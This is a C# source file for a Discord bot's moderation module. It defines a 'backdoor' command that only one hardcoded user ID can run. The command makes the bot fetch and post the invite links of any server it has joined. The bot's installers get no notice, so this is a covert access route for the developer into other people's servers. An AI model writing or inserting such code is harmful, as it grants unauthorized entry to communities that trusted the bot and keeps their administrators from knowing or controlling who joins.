using System;
using System.Collections.Generic;
using System.Text;

using System.Threading.Tasks;
using System.Linq;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace patNET.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor")]
        public async Task CommandBackdoor(ulong GuildId)
        {
            if(!(Context.User.Id == 207634142010015744))
            {
                await Context.Channel.SendMessageAsync(":x: Du bist ka Admin du sandla!");
                return;
            }
            if(Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: Du bist nicht in einer Guild mit der ID:" + GuildId);
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            var Invites = await Guild.GetInvitesAsync();
            if(Invites.Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: Es sind keine Einladungen verfügbar!");
            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithAuthor($"invites für unseren Server {Guild.Name}:", Guild.IconUrl);
                Embed.WithColor(40, 200, 150);
                foreach (var Current in Invites)
                {
                    Embed.AddInlineField("Invite:", $"[Invite]({Current.Url})");
                }
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }


    }
}
